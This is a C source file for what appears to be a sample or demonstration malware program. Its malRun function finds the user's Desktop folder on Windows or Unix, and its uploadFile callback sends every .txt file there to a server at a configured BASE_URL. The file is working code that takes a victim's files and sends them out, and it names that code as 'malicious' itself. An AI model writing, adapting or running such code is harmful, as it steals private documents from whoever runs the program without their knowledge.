#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#ifdef _WIN32
    #include <windows.h>
    #define PATH_SEPARATOR '\\'
#else
    #include <dirent.h>
    #include <sys/types.h>
    #define PATH_SEPARATOR '/'
#endif

#include "mal_settings.h"

int upload_file(const char *file_name, const char *url);

/**
 * List all files in a directory and call a callback function for each file.
 */
void listFiles(const char *directory, void (*callback)(const char *)) {
#ifdef _WIN32
    char search_pattern[1024];
    snprintf(search_pattern, sizeof(search_pattern), "%s\\*", directory);

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(search_pattern, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    char full_path[MAX_PATH];
    do {
        const char *name = findFileData.cFileName;
        if (strcmp(name, ".") != 0 && strcmp(name, "..") != 0) {
            snprintf(full_path, sizeof(full_path), "%s\\%s", directory, name);
            callback(full_path);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
#else
    struct dirent *entry;
    DIR *dp = opendir(directory);

    if (dp == NULL) {
        return;
    }

    char full_path[1024];
    while ((entry = readdir(dp))) {
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            snprintf(full_path, sizeof(full_path), "%s/%s", directory, entry->d_name);
            callback(full_path);
        }
    }
    closedir(dp);
#endif
}

/**
 * Percent-encode a string.
 */
char *urlEncode(const char *str) {
    const char *hex = "0123456789ABCDEF";
    char *encoded;
    size_t len = strlen(str);
    encoded = malloc(len * 3 + 1);  // Allocate maximum possible space
    char *p = encoded;

    for (size_t i = 0; i < len; i++) {
        unsigned char c = str[i];
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            // Alphanumeric characters and some special characters don't need to be encoded
            *p++ = c;
        } else {
            // Percent-encode the special character
            *p++ = '%';
            *p++ = hex[c >> 4];
            *p++ = hex[c & 15];
        }
    }
    *p = '\0';  // Null-terminate the encoded string
    return encoded;
}

/**
 * Get the file name from a file path.
 */
const char* getFileName(const char* filePath) {
    const char* fileName = NULL;
    const char* lastSeparator = NULL;

    if (filePath == NULL) {
        return NULL;
    }

    // Find the last occurrence of the path separator
    lastSeparator = strrchr(filePath, PATH_SEPARATOR);
    if (lastSeparator != NULL) {
        fileName = lastSeparator + 1;
    } else {
        // No separator found, return the whole filePath
        fileName = filePath;
    }

    return fileName;
}

/**
 * Upload a file to the server.
 */
void uploadFile(const char *file_path) {
    const char *extension = strrchr(file_path, '.');
    
    if (extension != NULL && strcmp(extension, ".txt") == 0) {
        char full_url[1024];
        
        // Escape special characters in file path
        char *encoded_file_name = urlEncode(getFileName(file_path));
        
        // Format the full URL
        snprintf(full_url, sizeof(full_url), "%s%s", BASE_URL, encoded_file_name);
        
        // Free the dynamically allocated memory
        free(encoded_file_name);

        // Upload the file
        upload_file(file_path, full_url);
    }
}

/**
 * Run the "malicious" code.
 */
void malRun() {
    char desktop_path[1024];

#ifdef _WIN32
    const char *username = getenv("USERNAME");
    snprintf(desktop_path, sizeof(desktop_path), "C:\\Users\\%s\\Desktop", username);
#else
    const char *home = getenv("HOME");
    snprintf(desktop_path, sizeof(desktop_path), "%s/Desktop", home);
#endif

    listFiles(desktop_path, uploadFile);
}